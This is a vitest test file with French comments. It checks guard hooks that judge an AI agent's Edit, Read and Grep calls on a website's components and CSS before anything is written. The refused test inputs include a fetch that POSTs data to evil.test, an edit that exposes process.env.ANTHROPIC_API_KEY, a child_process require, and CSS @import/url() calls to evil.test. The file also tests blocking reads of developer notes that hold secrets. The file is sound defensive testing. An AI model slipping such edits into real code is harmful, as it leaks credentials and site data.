import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import type { HookInput } from '@anthropic-ai/claude-agent-sdk'
import { afterAll, beforeAll, describe, it } from 'vitest'
import { createGuardHook, scopeOf, toolAccessFor, type HookEvent } from '../claude/hook'
import { loadDesignSystem, type DesignSystem } from './design-system'
import { checkToolUse, DISK_IO, editedContents, isReadable, lintContextFor, type GuardIO, type Verdict } from './guards'
import { lintTsxFiles, tsxSnapshot, tsxZone } from './tsx-lint'
import type { Hardcoded, ToolAccess, ZoneDef } from './types'

/**
 * SEC-07 : un Edit est jugé sur le fichier FUTUR (lecture du fichier + old_string → new_string, comme l'outil Edit),
 * contre le dernier commit, AVANT d'être écrit : l'aperçu (next dev) exécute un composant dès qu'il est écrit.
 * AI-08 : aucun document de développeur (CLAUDE.md, *.md) lisible ni fouillable. FOLLOWUPS #2 : zones marquées par
 * `editAttrs('<zone>'…)`. Sur les VRAIS fichiers de Conduit (design system, Integrations.tsx, Hero.module.css), copiés
 * dans un dépôt git jetable (le hook lit le fichier et sa version HEAD).
 */

const here = path.dirname(fileURLToPath(import.meta.url))
const REPO = path.resolve(here, '../../..')
const INTEGRATIONS = 'src/components/sections/Integrations/Integrations.tsx'
const HERO_CSS = 'src/components/sections/Hero/Hero.module.css'
const BANNER = 'src/components/sections/Banner/Banner.tsx'
const SITE_NOTES = 'src/app/(site)/CLAUDE.md'
const SITE_PAGE = 'src/app/(site)/page.tsx'

/** Composant de test à la manière de Conduit : zones marquées par editAttrs, texte écrit dans le code. */
const BANNER_SOURCE = `import { Button } from '@/components/ui/Button/Button'
import { editAttrs } from '@/lib/editor/preview'

import styles from './Banner.module.css'

export function Banner() {
  return (
    <section className={styles.banner} {...editAttrs('banner')}>
      <p className={styles.text} {...editAttrs('banner.text')}>Free trial for 30 days</p>
      <Button href="/signup" className={styles.cta} edit={editAttrs('banner.cta')}>
        Start now
      </Button>
    </section>
  )
}
`

const bannerZone = (selector: string): ZoneDef => ({
  label: selector,
  section: 'Banner',
  files: [BANNER],
  selectors: [selector],
  controls: [],
  text: { source: 'code', files: [BANNER] },
})

let ds: DesignSystem
let work: string
let integrations: string
let hero: string
const git = (...args: string[]) =>
  execFileSync('git', ['-c', 'user.name=test', '-c', 'user.email=test@example.invalid', '-c', 'commit.gpgsign=false', ...args], {
    cwd: work,
    stdio: ['ignore', 'pipe', 'ignore'],
  })

beforeAll(async () => {
  ds = await loadDesignSystem(REPO)
  integrations = await readFile(path.join(REPO, INTEGRATIONS), 'utf8')
  hero = await readFile(path.join(REPO, HERO_CSS), 'utf8')
  work = await mkdtemp(path.join(os.tmpdir(), 'kz-guards-edit-'))
  const files: [string, string][] = [
    [INTEGRATIONS, integrations],
    [HERO_CSS, hero],
    [BANNER, BANNER_SOURCE],
    [SITE_NOTES, '# Notes for developers\nPREVIEW_SECRET lives in engine/.env.local\n'],
    [SITE_PAGE, 'export default function Page() {\n  return null\n}\n'],
  ]
  for (const [file, content] of files) {
    await mkdir(path.dirname(path.join(work, file)), { recursive: true })
    await writeFile(path.join(work, file), content)
  }
  git('init', '-q')
  git('add', '-A')
  git('commit', '-qm', 'init')
})

afterAll(async () => {
  if (work) await rm(work, { recursive: true, force: true })
})

const reasonOf = (verdict: Verdict) => (verdict.allow ? '' : verdict.reason)

/** Accès d'une demande, comme engine-core le câble : fichiers du périmètre + contexte du lint (lintContextFor). */
const accessFor = (files: string[], scope: ('style' | 'text')[], zones: string[], hardcoded: Hardcoded[] = [], extra: Record<string, ZoneDef> = {}): ToolAccess => ({
  files,
  textTool: false,
  lint: lintContextFor({ ds: { policy: ds.policy, zones: { ...ds.zones, ...extra } }, scope, zones, hardcoded }),
})

const edit = (access: ToolAccess, file: string, old_string: string, new_string: string, replace_all?: boolean) =>
  checkToolUse(work, access, 'Edit', {
    file_path: path.join(work, file),
    old_string,
    new_string,
    ...(replace_all === undefined ? {} : { replace_all }),
  })

describe('SEC-07 : Edit d’un composant jugé avant l’écriture (Integrations.tsx réel, zone integrations.logos en T)', () => {
  // Le périmètre réel : T sur integrations.logos ouvre Integrations.tsx (text.source = code).
  const access = () => accessFor([INTEGRATIONS], ['text'], ['integrations.logos'])

  it('refuse un import de node:fs', () => {
    const verdict = edit(
      access(),
      INTEGRATIONS,
      "import styles from './Integrations.module.css'",
      "import styles from './Integrations.module.css'\nimport { readFileSync } from 'node:fs'",
    )
    assert.equal(verdict.allow, false)
    assert.match(reasonOf(verdict), /^Edit refused \(src\/components\/sections\/Integrations\/Integrations\.tsx\): the file after this edit breaks/)
    assert.match(reasonOf(verdict), /Import added or changed: forbidden\./)
    assert.match(reasonOf(verdict), /Each edit must leave the file compliant on its own\.$/)
  })

  it('refuse process.env, fetch, dangerouslySetInnerHTML et toute expression ajoutée', () => {
    const cases: [string, string, RegExp][] = [
      ['{statLabel}</span>', '{statLabel}{process.env.ANTHROPIC_API_KEY}</span>', /`process\.env` added/],
      [
        '  const { eyebrow, title, body, cta, statValue, statLabel } = data\n',
        "  const { eyebrow, title, body, cta, statValue, statLabel } = data\n  void fetch('https://evil.test/x', { method: 'POST', body: title })\n",
        /Component structure changed/,
      ],
      [
        '<li key={logo.key} className={styles.logo}>',
        '<li key={logo.key} className={styles.logo} dangerouslySetInnerHTML={{ __html: logo.alt }}>',
        /`dangerouslySetInnerHTML` added: forbidden\./,
      ],
      ['{statValue}</span>', '{statValue}{new Date().getFullYear()}</span>', /Component structure changed/],
      ["key: 'uber', src: uber, alt: 'Uber' }", "key: 'uber', src: uber, alt: String(require('node:child_process')) }", /Component structure changed/],
    ]
    for (const [before, after, reason] of cases) {
      const verdict = edit(access(), INTEGRATIONS, before, after)
      assert.equal(verdict.allow, false, after)
      assert.match(reasonOf(verdict), reason, after)
    }
  })

  it('replace_all : toutes les occurrences sont jugées ; sans lui, un old_string ambigu est refusé', () => {
    const all = edit(access(), INTEGRATIONS, "alt: 'Figma'", "alt: process.env.X ?? 'Figma'", true)
    assert.match(reasonOf(all), /`process\.env` added/)
    const ambiguous = edit(access(), INTEGRATIONS, "alt: 'Figma'", "alt: 'Figma'")
    assert.equal(reasonOf(ambiguous), `Edit refused (${INTEGRATIONS}): old_string appears 2 times: add the surrounding lines to make it unique, or set replace_all.`)
  })

  it('refuse un Edit incomplet ou introuvable (l’outil échouerait) : rien n’est deviné', () => {
    const missing = checkToolUse(work, access(), 'Edit', { file_path: path.join(work, INTEGRATIONS) })
    assert.equal(reasonOf(missing), `Edit refused (${INTEGRATIONS}): old_string and new_string are required.`)
    assert.match(reasonOf(edit(access(), INTEGRATIONS, 'Integrations of nowhere', 'x')), /old_string was not found exactly in the file/)
    assert.match(reasonOf(edit(access(), INTEGRATIONS, '', 'x')), /old_string is empty/)
    const flag = checkToolUse(work, access(), 'Edit', { file_path: path.join(work, INTEGRATIONS), old_string: 'a', new_string: 'b', replace_all: 'yes' })
    assert.match(reasonOf(flag), /replace_all must be true or false/)
  })

  it('sans contexte du lint (moteur pas câblé) : aucun composant n’est écrit', () => {
    const verdict = edit({ files: [INTEGRATIONS], textTool: false }, INTEGRATIONS, "alt: 'Uber'", "alt: 'Uber Eats'")
    assert.match(reasonOf(verdict), /a component can only be changed when each edit is checked before it is written/)
  })
})

describe('SEC-07 : chaîne réelle du hook (toolAccessFor + lint d’engine-core → createGuardHook d’engine-claude)', () => {
  // Forme exacte que doit câbler engine-core (FOLLOWUPS #36 / Demandes de contrat 5) : périmètre d'engine-claude,
  // PLUS lint = lintContextFor(…) avec le tableau vivant `hardcoded`. Le hook du SDK passe `access` tel quel.
  const banner = { banner: bannerZone('.banner'), 'banner.text': bannerZone('.text'), 'banner.cta': bannerZone('.cta') }
  const wired = (lint: boolean, zone = 'integrations.logos'): ToolAccess => {
    const request = { scope: ['text'] as ('style' | 'text')[], targets: [{ zone }] }
    const zones = { ...ds.zones, ...banner }
    const base = toolAccessFor(zones, { scope: scopeOf(request.scope), targets: request.targets }, 0)
    if (!lint) return base
    const context = lintContextFor({ ds: { policy: ds.policy, zones }, scope: request.scope, zones: request.targets.map((t) => t.zone), hardcoded: [] })
    return { ...base, lint: context }
  }
  const hookEdit = async (access: ToolAccess, old_string: string, new_string: string, file = INTEGRATIONS) => {
    const events: HookEvent[] = []
    const hook = createGuardHook(work, access, (event) => events.push(event))
    const input = {
      hook_event_name: 'PreToolUse',
      tool_name: 'Edit',
      tool_input: { file_path: path.join(work, file), old_string, new_string },
      session_id: 's',
      transcript_path: '',
      cwd: work,
      tool_use_id: 't',
    } as unknown as HookInput
    const output = (await hook(input, undefined, { signal: new AbortController().signal })) as {
      hookSpecificOutput?: { permissionDecision?: string; permissionDecisionReason?: string }
    }
    return { decision: output.hookSpecificOutput?.permissionDecision ?? 'allow', reason: output.hookSpecificOutput?.permissionDecisionReason ?? '', events }
  }

  it('le périmètre T ouvre bien le composant de la zone (integrations.logos, banner.text)', () => {
    assert.deepEqual(wired(false).files, [INTEGRATIONS])
    assert.deepEqual(wired(false, 'banner.text').files, [BANNER])
  })

  it('avec lint : Edit dangereux refusé AVANT l’écriture (deny + étape warn), vrai changement de texte permis', async () => {
    const danger = await hookEdit(wired(true), '{statLabel}</span>', '{statLabel}{process.env.ANTHROPIC_API_KEY}</span>')
    assert.equal(danger.decision, 'deny')
    assert.match(danger.reason, /`process\.env` added/)
    assert.deepEqual(danger.events, [{ kind: 'warn', label: danger.reason }])
    const node = await hookEdit(
      wired(true),
      "import styles from './Integrations.module.css'",
      "import styles from './Integrations.module.css'\nimport { readFileSync } from 'node:fs'",
    )
    assert.equal(node.decision, 'deny')
    assert.match(node.reason, /Import added or changed: forbidden\./)
    // Une donnée du composant (alt d'un logo) n'est pas un texte de zone : refusée aussi.
    assert.equal((await hookEdit(wired(true), "alt: 'Uber'", "alt: 'Uber Eats'")).decision, 'deny')
    const text = await hookEdit(wired(true, 'banner.text'), 'Free trial for 30 days', 'Free trial for 60 days', BANNER)
    assert.deepEqual([text.decision, text.events], ['allow', []])
    // Le hook n'écrit jamais : les fichiers sont intacts.
    assert.equal(await readFile(path.join(work, INTEGRATIONS), 'utf8'), integrations)
    assert.equal(await readFile(path.join(work, BANNER), 'utf8'), BANNER_SOURCE)
  })

  it('sans lint (engine-core pas encore câblé) : même le vrai changement de texte d’un composant est refusé', async () => {
    const text = await hookEdit(wired(false, 'banner.text'), 'Free trial for 30 days', 'Free trial for 60 days', BANNER)
    assert.equal(text.decision, 'deny')
    assert.match(text.reason, /a component can only be changed when each edit is checked before it is written/)
  })
})

describe('SEC-07 : un vrai changement de texte passe (zones marquées par editAttrs)', () => {
  const zones = { banner: bannerZone('.banner'), 'banner.text': bannerZone('.text'), 'banner.cta': bannerZone('.cta') }

  it('texte de la zone visée : permis ; texte d’une autre zone : refusé', () => {
    const text = accessFor([BANNER], ['text'], ['banner.text'], [], zones)
    assert.deepEqual(edit(text, BANNER, 'Free trial for 30 days', 'Free trial for 60 days'), { allow: true })
    assert.match(reasonOf(edit(text, BANNER, 'Start now', 'Get started')), /Text outside the zone changed: “Start now”/)
    // Texte passé à un composant par edit={editAttrs(…)} : dans la zone banner.cta.
    const cta = accessFor([BANNER], ['text'], ['banner.cta'], [], zones)
    assert.deepEqual(edit(cta, BANNER, 'Start now', 'Get started'), { allow: true })
  })

  it('retirer ou renommer un marquage editAttrs est refusé (data-edit intact)', () => {
    const text = accessFor([BANNER], ['text'], ['banner.text'], [], zones)
    const removed = edit(text, BANNER, " {...editAttrs('banner.text')}", '')
    assert.match(reasonOf(removed), /The data-edit="banner\.text" attribute must stay intact\./)
    const renamed = edit(text, BANNER, "editAttrs('banner.cta')", "editAttrs('banner.link')")
    assert.match(reasonOf(renamed), /The data-edit="banner\.cta" attribute must stay intact\./)
  })
})

describe('SEC-07 : Edit d’un CSS jugé avant l’écriture (Hero.module.css réel, zone hero.lede)', () => {
  const LEDE = '.lede {\n  max-inline-size: 28.75rem; /* 460 */\n  color: var(--color-text-muted);'
  const style = (hardcoded: Hardcoded[] = []) => accessFor([HERO_CSS], ['style'], ['hero.lede'], hardcoded)
  const lede = (lines: string) => LEDE.replace('color: var(--color-text-muted);', lines)

  it('un changement de token de la zone passe', () => {
    assert.ok(hero.includes(LEDE))
    assert.deepEqual(edit(style(), HERO_CSS, LEDE, lede('color: var(--color-text);')), { allow: true })
    assert.deepEqual(edit(style(), HERO_CSS, LEDE, lede('color: var(--color-text);\n  padding-block: var(--space-16);')), { allow: true })
  })

  it('refuse @import, url(), une valeur en dur, un autre élément', () => {
    const cases: [string, string, RegExp][] = [
      [LEDE, `@import url("https://evil.test/x.css");\n${LEDE}`, /@import/],
      [LEDE, lede('color: red;'), /red/],
      [LEDE, lede('color: var(--color-text-muted);\n  background: url("https://evil.test/p.png");'), /background/],
      ['.title {\n  max-inline-size: 28.625rem;', '.title {\n  color: var(--color-text-accent);\n  max-inline-size: 28.625rem;', /\.title/],
    ]
    for (const [before, after, reason] of cases) {
      const verdict = edit(style(), HERO_CSS, before, after)
      assert.equal(verdict.allow, false, after)
      assert.match(reasonOf(verdict), reason, after)
    }
  })

  it('replace_all qui touche la règle d’un autre élément : refusé', () => {
    const verdict = edit(style(), HERO_CSS, 'color: var(--color-text-muted);', 'color: var(--color-text);', true)
    assert.equal(verdict.allow, false)
    assert.match(reasonOf(verdict), /\.rating/)
  })

  it('chaque Edit doit être conforme seul : font sans son tracking refusé, les deux ensemble permis', () => {
    assert.equal(edit(style(), HERO_CSS, LEDE, lede('color: var(--color-text-muted);\n  font: var(--text-body-strong);')).allow, false)
    const pair = lede('color: var(--color-text-muted);\n  font: var(--text-body-strong);\n  letter-spacing: var(--text-body-tracking);')
    assert.deepEqual(edit(style(), HERO_CSS, LEDE, pair), { allow: true })
  })

  it('une valeur accordée par le client pendant l’essai compte aussitôt (tableau vivant)', () => {
    const hardcoded: Hardcoded[] = []
    const access = style(hardcoded)
    const padded = lede('color: var(--color-text-muted);\n  padding: 1rem;')
    assert.equal(edit(access, HERO_CSS, LEDE, padded).allow, false)
    hardcoded.push({ property: 'padding', value: '1rem' })
    assert.deepEqual(edit(access, HERO_CSS, LEDE, padded), { allow: true })
  })

  it('le fichier futur part de la copie de travail et se juge contre le dernier commit', async () => {
    const file = path.join(work, HERO_CSS)
    await writeFile(file, hero.replace(LEDE, lede('color: var(--color-text);')))
    try {
      assert.deepEqual(edit(style(), HERO_CSS, 'color: var(--color-text);', 'color: var(--color-text-accent);'), { allow: true })
      assert.equal(edit(style(), HERO_CSS, 'color: var(--color-text);', 'color: red;').allow, false)
    } finally {
      await writeFile(file, hero)
    }
  })

  it('sans contexte du lint : un CSS reste jugé après l’essai (transition)', () => {
    assert.deepEqual(edit({ files: [HERO_CSS], textTool: false }, HERO_CSS, LEDE, lede('color: red;')), { allow: true })
  })

  it('un fichier illisible au dernier commit est jugé comme nouveau : refusé', () => {
    const io: GuardIO = { ...DISK_IO, head: () => null }
    const verdict = checkToolUse(work, style(), 'Edit', { file_path: path.join(work, HERO_CSS), old_string: LEDE, new_string: lede('color: var(--color-text);') }, io)
    assert.equal(verdict.allow, false)
  })
})

describe('editedContents : le fichier futur, comme l’outil Edit', () => {
  it('remplace littéralement la première occurrence, ou toutes', () => {
    assert.deepEqual(editedContents('abcd', 'b', '$&$1', false), { contents: ['a$&$1cd'] })
    assert.deepEqual(editedContents('abcb', 'b', 'x', true), { contents: ['axcx'] })
  })

  it('juge aussi la suppression qui emporte le saut de ligne (deux jetons recollés)', () => {
    assert.deepEqual(editedContents("const a = impoX\nrt('x')", 'X', '', false), { contents: ["const a = impo\nrt('x')", "const a = import('x')"] })
  })

  it('juge aussi new_string sans ses blancs de fin de ligne', () => {
    assert.deepEqual(editedContents('a b', 'b', 'c  \nd\t', false), { contents: ['a c  \nd\t', 'a c\nd'] })
  })

  it('fichier absent ou vide, old_string vide, introuvable ou ambigu', () => {
    assert.deepEqual(editedContents(null, '', 'x', false), { contents: ['x'] })
    assert.deepEqual(editedContents('', '', 'x', false), { contents: ['x'] })
    assert.ok('error' in editedContents(null, 'a', 'x', false))
    assert.ok('error' in editedContents('abc', '', 'x', false))
    assert.ok('error' in editedContents('abc', 'z', 'x', false))
    assert.ok('error' in editedContents('abab', 'ab', 'x', false))
  })
})

describe('AI-08 : aucun document de développeur lisible ni fouillable dans les dossiers du site', () => {
  it('isReadable refuse tout Markdown et tout chemin caché, même sous un dossier du site', () => {
    for (const relative of [
      SITE_NOTES,
      'src/app/(site)/claude.MD',
      'src/components/AGENTS.md',
      'src/components/sections/Hero/README.md',
      'src/lib/notes.mdx',
      'src/styles/guide.markdown',
      'src/components/.claude/settings.json',
      'src/components/.DS_Store',
    ]) {
      assert.equal(isReadable(relative), false, relative)
    }
    assert.equal(isReadable(SITE_PAGE), true)
  })

  it('Read de CLAUDE.md refusé', () => {
    const verdict = checkToolUse(work, { files: [], textTool: false }, 'Read', { file_path: path.join(work, SITE_NOTES) })
    assert.equal(verdict.allow, false)
  })

  it('Grep dans un dossier qui contient un fichier illisible : seulement restreint au code', () => {
    const grep = (input: Record<string, unknown>) =>
      checkToolUse(work, { files: [], textTool: false }, 'Grep', { pattern: 'SECRET', path: path.join(work, 'src/app/(site)'), ...input })
    assert.equal(
      reasonOf(grep({})),
      'Search refused in src/app/(site): it holds files that cannot be read; pass glob: "*.{tsx,ts,css}" (or type: "ts" or "css").',
    )
    for (const glob of ['*.md', '**/CLAUDE.md', '*.{tsx,md}', 'CLAUDE.*', '*', '**/*']) assert.equal(grep({ glob }).allow, false, glob)
    for (const input of [{ glob: '*.tsx' }, { glob: '**/*.{tsx,ts,css}' }, { type: 'ts' }, { type: 'css', glob: '*.md' }]) {
      assert.equal(grep(input).allow, true, JSON.stringify(input))
    }
    // Glob ne rend que des noms de fichiers : permis.
    assert.equal(checkToolUse(work, { files: [], textTool: false }, 'Glob', { pattern: '**/*', path: path.join(work, 'src/app/(site)') }).allow, true)
  })

  it('Grep libre dans un dossier sans fichier illisible ; dossier illisible ou trop grand : restreint', () => {
    const access = { files: [], textTool: false }
    assert.equal(checkToolUse(work, access, 'Grep', { pattern: 'x', path: path.join(work, 'src/components') }).allow, true)
    assert.equal(checkToolUse(work, access, 'Grep', { pattern: 'x', path: path.join(work, INTEGRATIONS) }).allow, true)
    const unlisted: GuardIO = { ...DISK_IO, list: () => null }
    assert.equal(checkToolUse(work, access, 'Grep', { pattern: 'x', path: path.join(work, 'src/components') }, unlisted).allow, false)
  })
})

describe('FOLLOWUPS #2 : zones marquées par editAttrs (Integrations.tsx réel)', () => {
  it('relève les zones de {...editAttrs(…)} et edit={editAttrs(…)}, pas editAttrs(null, …)', () => {
    assert.deepEqual(tsxSnapshot(INTEGRATIONS, integrations).dataEdit, [
      'integrations',
      'integrations.eyebrow',
      'integrations.title',
      'integrations.body',
      'integrations.cta',
      'integrations.stat',
      'integrations.logos',
    ])
    const doc = "export const Item = ({ id }: { id: string }) => <li {...editAttrs(null, { doc: id })}>x</li>\n"
    assert.deepEqual(tsxSnapshot('src/components/Item.tsx', doc).dataEdit, [])
  })

  it('un marquage retiré ou renommé : refus data-edit, en plus du squelette', () => {
    const zone = tsxZone('integrations.logos', ds.zones['integrations.logos'])
    const lint = (after: string) => lintTsxFiles(INTEGRATIONS, integrations, after, { style: false, text: true }, zone).map((violation) => violation.rule)
    const removed = integrations.replace(" {...editAttrs('integrations.logos')}", '')
    assert.notEqual(removed, integrations)
    assert.ok(lint(removed).includes('data-edit'))
    const renamed = integrations.replace("edit={editAttrs('integrations.cta')}", "edit={editAttrs('integrations.link')}")
    assert.notEqual(renamed, integrations)
    assert.ok(lint(renamed).includes('data-edit'))
  })
})
